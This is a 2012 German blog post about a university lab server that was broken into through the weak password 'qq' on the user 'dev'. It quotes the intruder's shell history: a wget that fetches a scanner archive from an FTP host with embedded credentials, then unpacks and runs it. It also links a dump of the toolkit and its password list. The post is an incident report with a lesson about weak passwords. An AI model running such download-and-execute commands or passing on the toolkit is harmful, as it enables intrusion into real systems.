---
title: Hack'd
date: 18.05.2012, 20:37
tags: Linux
permalink: /2012/qq-und-die-it-sicherheit/
---

Letzten Mittwoch bekam ich während einer Vorlesung 'ne Mail, dass das
Rechenzentrum der Universität einen Hack0r-Angriff an einem unserer
Rechensklaven festgestellt hat. Etwas schockiert, wie DAS nur mit LINUX
passieren konnte, bin ich schnell vorbeigekommen und fand in der Tat eine Art
"Bot".

Als ordentlicher Sys-Admin nutzen ich und meine Kollegin nur SSH-Keys und so
dachte ich mir auch nichts, als ich bei der versehentlichen Deskop-Variante
von Ubuntu dem Standard-Nutzer das Passwort `qq` zu geben, immerhin würde ich
ja den SSH-Zugang auf Schlüsseldateien beschränken. Naja, dazu kam es dann
doch nicht, weil sich die Biologen im Praktikum schon so schwer genug mit
einer UNIX-Shell tun und so konnte man sich weiterhin per Passwort einloggen.

So hat sich dann nach mehreren Monaten -- 191 Tage um genau zu sein -- doch
endlich jemand gefunden und den viel, viel schwereren Nutzernamen zu obigem
Passwort zu finden! Nämlich "dev". Das ist *Security by Obscurity* vom
feinsten! Der Bot war aber auch nicht der klügste. Seine Aktivitäten waren
(primär Portscanning) komplett in der *.bash_history* nachzulesen:

    :::sh
    $ wget ftp://test:testtest@62.160.84.235/KapelaScan.tgz; tar zxvf K*
    $ rm -rf KapelaScan.tgz; cd kapela
    $ chmod +x *
    $ ls
    $ ./a 80.236
    $ ps x

Ein `rm -rf /home/dev` setzte dem Spuk dann ein Ende. Wer an einem
[Dump](/files/2012/kapela.zip) interessiert ist. Inklusive Passwortliste, wo
auch `qq` gelistet war. Es ist also *wirklich* ein unsicheres Passwort :-)
